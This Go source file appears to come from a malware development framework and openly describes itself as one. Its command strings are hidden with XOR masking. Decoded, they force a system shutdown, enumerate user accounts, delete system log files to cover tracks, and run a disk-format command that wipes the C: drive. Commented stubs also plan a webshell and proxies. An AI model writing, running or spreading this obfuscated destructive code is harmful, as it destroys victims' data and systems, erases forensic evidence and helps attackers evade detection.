// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package deepfire

import (
	"os"
	"strings"
)

func shutdown() error {
	c := (func() string {
mask := []byte("\x20\x10\xa6\x11\x7c\x75\x5c\x2a\x7b\x4e\x18\x29\xae\xc7\xc5\x06\xc1")
maskedStr := []byte("\x53\x78\xd3\x65\x18\x1a\x2b\x44\x5b\x63\x6b\x09\x83\xb3\xe5\x30\xf1")
res := make([]byte, 17)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
	_, err := cmdOut(c)

	return err
}

func users() ([]string, error) {
	clear := []string{}
	o, err := cmdOut((func() string {
mask := []byte("\x64\x07\xcc\x17\xb0\x8f\xd5\xd2")
maskedStr := []byte("\x0a\x62\xb8\x37\xc5\xfc\xb0\xa0")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	if err != nil {
		return nil, err
	}

	lines := strings.Split(o, (func() string {
mask := []byte("\xe3")
maskedStr := []byte("\xe9")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))

	for l := range lines {
		line := lines[l]
		if !ContainsAny(line, []string{(func() string {
mask := []byte("\x50\x6a\x9a\x48\x04\xa3\xba\x7b\x22\xd1\x15\x7d")
maskedStr := []byte("\x31\x09\xf9\x27\x71\xcd\xce\x08\x02\xb7\x7a\x0f")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x2a\x8f\x5e\x35\x8e\xfd")
maskedStr := []byte("\x07\xa2\x73\x18\xa3\xd0")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x26\x3d\x98\xf0\x10\x18\xd7\x1e\xdc")
maskedStr := []byte("\x45\x52\xf5\x80\x7c\x7d\xa3\x7b\xb8")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())}) {
			clear = append(clear, line)
		}
	}

	return clear, nil
	// return strings.Fields(strings.Join(clear, " ")), nil
	// usrs := []string{}
	//   users, err := wapi.ListLoggedInUsers()
	//   if err != nil {
	//       return nil, err
	//   }
	//   for _, u := range(users){
	//       usrs = append(usrs, u.FullUser())
	//   }
	//   return usrs, nil
}

func clearLogs() error {
	os.Chdir((func() string {
mask := []byte("\x1d\x54\x3a\x4d\xf3\xed\xdb\x19\x46\xf8\x5b\xf3\xe5\x2c\x4b\xb6\x80\x08\x4d\x27\x71\x58\xaa\x81")
maskedStr := []byte("\x38\x23\x53\x23\x97\x84\xa9\x3c\x1a\x8b\x22\x80\x91\x49\x26\x85\xb2\x54\x2e\x48\x1f\x3e\xc3\xe6")
res := make([]byte, 24)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	_, err := cmdOut((func() string {
mask := []byte("\x28\x1c\x8a\xb5\x47\x6a\x84\x1b\xf2\x23\xc1\xc0\x6e\x51\xf9\xb5\x19\x80\xcd\xf8")
maskedStr := []byte("\x4c\x79\xe6\x95\x6d\x06\xeb\x7c\xd2\x0c\xa0\xe0\x41\x22\xd9\x9a\x68\xa0\xe2\x9e")
res := make([]byte, 20)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	if err != nil {
		return err
	}

	return nil
}

func wipe() error {
	cmd := (func() string {
mask := []byte("\x06\x6b\x31\xf6\x23\x84\x1c\xb6\xbf\xea\x59\x9b\xd8\x4f\x84\x04\xdb\x4b")
maskedStr := []byte("\x60\x04\x43\x9b\x42\xf0\x3c\xd5\x85\xca\x76\xfd\xab\x75\xea\x70\xbd\x38")
res := make([]byte, 18)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}

// func dialog(message, title string) {
// 	zenity.Info(message, zenity.Title(title))
// }

// func SplitMultiSep(s string, seps []string) []string {
// 	f := func(c rune) bool {
// 		for _, sep := range seps {
// 			if c == sep { // what?
// 				return true
// 			}
// 		}
// 	}
// 	fields := strings.FieldsFunc(s, f)
// 	return fields
// }

/*

func keyboard_emul(keys string) error {

}

func proxy_tcp() error {

}

func proxy_udp() error {

}

func proxy_http() error {

}

func webshell(param, password string) error {

}

func stamp() {

}

func detect_user_interaction() (bool, error) {

}*/
